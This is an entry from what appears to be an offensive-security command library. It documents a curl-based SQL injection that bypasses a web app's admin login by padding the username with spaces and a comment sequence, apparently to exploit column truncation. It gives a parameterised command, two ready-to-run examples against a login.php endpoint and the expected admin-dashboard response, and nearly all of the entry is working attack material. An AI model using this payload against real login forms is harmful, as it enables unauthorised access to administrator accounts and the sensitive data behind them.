---
id: a0a7f0fb-0fcf-4d87-ba70-0531f8c729ee
name: curl-admin-truncation-payload
type: command
executor: bash
data: >-
  curl -X POST http://target.com/login.php -d "username=admin               '--"
  -d "password=anything" -b cookies.txt -c cookies.txt
output: null
created_at: '2023-04-06T03:56:34.879290+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - sql-injection
  - bypass
  - truncation
verified: true
validated: true
---

# curl-admin-truncation-payload

## Command

```bash
curl -X POST $_TARGET_URL -d "username=$_PAYLOAD" -d "password=$_PASSWORD" -b $_COOKIE_FILE -c $_COOKIE_FILE
```

## Description

This command submits a truncation-based SQL injection payload to bypass admin login in a vulnerable MySQL web app, exploiting varchar length limits to comment out the password check.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Login endpoint URL | Yes |
| $_PAYLOAD | Injection payload (e.g., admin followed by spaces and ' -- ) | Yes |
| $_PASSWORD | Arbitrary password (ignored due to injection) | No |
| $_COOKIE_FILE | Session cookie file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/login.php -d "username=admin               '--" -d "password=anything" -b cookies.txt -c cookies.txt
```

### Advanced Usage

With silent mode and follow redirect:

```bash
curl -s -L -X POST http://target.com/login.php -d "username=admin     ' -- " -d "password=foo" -b cookies.txt -c cookies.txt
```

## Expected Output

Successful login response:

```
<html><head><title>Admin Dashboard</title></head><body><h1>Welcome, Admin!</h1><p>Access granted to sensitive data.</p></body></html>
```

## Related

- [[procedures/Bypass-Admin-Login-via-MySQL-Injection-and-Truncation]]
- [[commands/curl-test-mysql-injection]]
